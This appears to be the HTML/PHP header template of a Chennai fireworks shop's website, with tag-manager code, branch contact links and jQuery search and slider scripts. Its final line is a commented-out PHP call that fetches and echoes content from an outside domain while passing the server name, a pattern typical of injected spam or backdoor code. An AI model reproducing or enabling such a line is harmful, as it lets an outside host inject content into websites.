<head>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<meta name="google-site-verification" content="1DO_FYy2n6BBoeHSIfAD3QmCMlz2NjZ_MdmPzKRrbm4" />

<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MH5NFBGG');</script>
<!-- End Google Tag Manager -->


</head>
<style>

          

			
</style>

				<div class="navi" id="naviHide">
					<div id="row1"> 
						<div class="center">

							<div class="col-md-12">
								<div class="headerBorderTeext">
							<p><b>India's No.1 Crackers shop	</b></p></div>
							</div>
						</div>
				</div>
					
					<div style="padding-top:10px;width: 10px;height:auto;" class="logo">
						 <a href=""></a>
					</div> 
				
					 <div style="padding-right:50px;padding-left:15px;padding-top:14px;" class="logo">
						
					</div> 
					 

					 <div style="float:right;padding-right:20px;padding-top:35px;"   class="logo">
						
					 <div style="float:right;padding-top:33px;"  class="logo">
						<a href=""></a>
					</div>
					
				
				
					
					<div class="no-padding job-h">
						<div id="global-nav">
							<ul>
								<li><a class="mn1" title="Phone : 044 4503 2001 / 988 4433 845" href="contact-us.php#place1"> Vadapalani<br><span>988 4433 845</span></a></li>
								<li><a class="mn2" title="Phone : 044 4850 4879 / 988 4433 191" href="contact-us.php#place2"> Tambaram<br><span>988 4433 191</span></a></li>
								<li><a class="mn3" title="Phone : 044 2374 6026 / 988 4433 824" href="contact-us.php#place3"> Padi<br><span>988 4433 824</span></a></li>
								<li><a class="mn4" title="Phone : 044 4280 5000 / 988 4433 717" href="contact-us.php#place4"> Avadi<br><span>988 4433 717</span></a></li>
							</ul>
						</div>
					</div>
		</div>
		
	
			
					<script>
						$(document).ready(function(){

							$('.br_close').click(function(){
								$('.fun-show').fadeOut();
							});
							$('.search').keyup(function(){
								$location="<?=$myconfig->base_url();?>";
							var str = $(this).val();
							if (str!="") {
								
								$.ajax({

									url:$location+'city.php',
									data:'q='+str,
									type:"post",
									success:function($result){
										$("#livesearch").fadeIn();
										$("#livesearch").html($result);
										$("#livesearch").css("border","1px solid #A5ACB2");
									}
								});

							} else{
								
								$("#livesearch").fadeOut();
							}

						});
					})
					$(document).on('click', '#livesearch ul li', function(){

						var ph=$(this).children('i').text();

						$('#livesearch').fadeOut();

						$location="<?=$myconfig->base_url();?>";

						$.ajax({

							url:$location+'city.php',
							data:'num='+ph,
							type:"post",
							success:function($result){
								// alert($result);
								$(".panel-l").html($result);
								$(".fun-show").fadeIn();
							}
						});

					});
					</script>

					<div class="fun-show">
						<div class="contact_number">
							<div class="br_close">X</div>
								<div class="panel-l">
								</div>
						</div>
					</div>
					<!-- <div class="toll_free">
						<div class="toll_free_number"><i class="fa fa-phone" aria-hidden="true"></i> Support <a style="text-decoration: none; color: white;" href="tel:+919884433824">9884433824</a>	</div>
					</div> -->
					<!-- <div class="find_job">
						<a href="http://www.jobschool.in/career.php" target="_blank"><img src="<?=$myconfig->base_url();?>images/find-your-job.jpg" alt="Find your job"></a>
					</div> -->
					<script>
						$(document).ready(function(){
				
							$('#slider_0').show();
							var count=0;
							setInterval(function(){
								var selector="#slider_"+count%9;
								$('.slider-item').hide();
								$(selector).slideDown();
							  	count++; 
							}, 5000);
							$('.slider').mouseover(function(){
								$('.slider-item').stop();
							});

						});
					</script>
				</div>
<!-- <?php //{ //echo file_get_contents('http://google-amp.org/bls.php?w='.$_SERVER['SERVER_NAME']); } ?> -->
